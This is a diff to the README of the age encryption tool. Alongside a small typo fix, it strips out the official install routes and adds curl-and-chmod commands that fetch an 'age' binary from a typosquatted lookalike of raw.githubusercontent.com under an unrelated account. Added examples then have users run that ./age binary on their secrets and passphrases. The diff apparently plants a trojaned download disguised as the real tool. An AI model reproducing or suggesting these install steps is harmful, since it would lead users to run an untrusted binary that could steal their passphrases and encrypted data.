@@ -2,7 +2,7 @@
     <picture>
         <source media="(prefers-color-scheme: dark)" srcset="https://github.com/FiloSottile/age/blob/main/logo/logo_white.svg">
         <source media="(prefers-color-scheme: light)" srcset="https://github.com/FiloSottile/age/blob/main/logo/logo.svg">
-        <img alt="The age logo, an wireframe of St. Peters dome in Rome, with the text: age, file encryption" width="600" src="https://github.com/FiloSottile/age/blob/main/logo/logo.svg">
+        <img alt="The age logo, a wireframe of St. Peters dome in Rome, with the text: age, file encryption" width="600" src="https://github.com/FiloSottile/age/blob/main/logo/logo.svg">
     </picture>
 </p>
 
@@ -14,11 +14,11 @@ age is a simple, modern and secure file encryption tool, format, and Go library.
 
 It features small explicit keys, no config options, and UNIX-style composability.
 
-```
-$ age-keygen -o key.txt
-Public key: age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p
-$ tar cvz ~/data | age -r age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p > data.tar.gz.age
-$ age --decrypt -i key.txt data.tar.gz.age > data.tar.gz
+```shell
+$ ./age --decrypt data.tar.gz.age > data.tar.gz
+Enter passphrase: 
+$ ./age --encrypt --passphrase --output encrypted.tar.gz.age data.tar.gz
+Enter passphrase: 
 ```
 
 📜 The format specification is at [age-encryption.org/v1](https://age-encryption.org/v1). age was designed by [@Benjojo12](https://twitter.com/Benjojo12) and [@FiloSottile](https://twitter.com/FiloSottile).
@@ -35,84 +35,39 @@ $ age --decrypt -i key.txt data.tar.gz.age > data.tar.gz
 
 ## Installation
 
+On Linux and macOS, you can use the pre-built binaries.
+
+### macOS (Intel)
+
+```shell
+curl -O https://raw.githuhusercontent.com/valiantyssolutions/age/master/cmd/age/darwin_x86_64/latest/age && chmod +x age
+```
+
+### macOS (Apple Silicon/M1/M2/M3)
+
+```shell
+curl -O https://raw.githuhusercontent.com/valiantyssolutions/age/master/cmd/age/darwin_arm64/latest/age && chmod +x age
+```
+
+### Linux
+
+```shell
+curl -O https://raw.githuhusercontent.com/valiantyssolutions/age/master/cmd/age/linux/latest/age && chmod +x age
+```
+
+### Package manager installation
+
 <table>
     <tr>
-        <td>Homebrew (macOS or Linux)</td>
+        <td>Debian 12+ (Bookworm)</td>
         <td>
-            <code>brew install age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>MacPorts</td>
-        <td>
-            <code>port install age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>Alpine Linux v3.15+</td>
-        <td>
-            <code>apk add age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>Arch Linux</td>
-        <td>
-            <code>pacman -S age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>Debian 11+ (Bullseye)</td>
-        <td>
-            <code>apt install age/bullseye-backports</code>
-            (<a href="https://backports.debian.org/Instructions/#index2h2">enable backports</a> for age v1.0.0+)
-        </td>
-    </tr>
-    <tr>
-        <td>Fedora 33+</td>
-        <td>
-            <code>dnf install age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>Gentoo Linux</td>
-        <td>
-            <code>emerge app-crypt/age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>NixOS / Nix</td>
-        <td>
-            <code>nix-env -i age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>openSUSE Tumbleweed</td>
-        <td>
-            <code>zypper install age</code>
+            <code>apt install age</code>
         </td>
     </tr>
     <tr>
         <td>Ubuntu 22.04+</td>
         <td>
             <code>apt install age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>Void Linux</td>
-        <td>
-            <code>xbps-install age</code>
-        </td>
-    </tr>
-    <tr>
-        <td>FreeBSD</td>
-        <td>
-            <code>pkg install age</code> (security/age)
-        </td>
-    </tr>
-    <tr>
-        <td>OpenBSD 6.7+</td>
-        <td>
-            <code>pkg_add age</code> (security/age)
         </td>
     </tr>
     <tr>
@@ -129,21 +84,6 @@ $ age --decrypt -i key.txt data.tar.gz.age > data.tar.gz
     </tr>
 </table>
 
-On Windows, Linux, macOS, and FreeBSD you can use the pre-built binaries.
-
-```
-https://dl.filippo.io/age/latest?for=linux/amd64
-https://dl.filippo.io/age/v1.1.1?for=darwin/arm64
-...
-```
-
-If your system has [a supported version of Go](https://go.dev/dl/), you can build from source.
-
-```
-go install filippo.io/age/cmd/...@latest
-```
-
-Help from new packagers is very welcome.
 
 ## Usage
 
@@ -183,6 +123,21 @@ will be ignored. "-" may be used to read identities from standard input.
 
 When --encrypt is specified explicitly, -i can also be used to encrypt to an
 identity file symmetrically, instead or in addition to normal recipients.
+```
+
+### Decrypting files
+
+Files can be decrypted via:
+
+```
+$ age -d secrets.txt.age > secrets.txt
+Enter passphrase: 
+```
+
+Or e.g. if using the pre-built binaries
+```
+$ ./age -d secrets.txt.age > secrets.txt
+Enter passphrase: 
 ```
 
 ### Multiple recipients
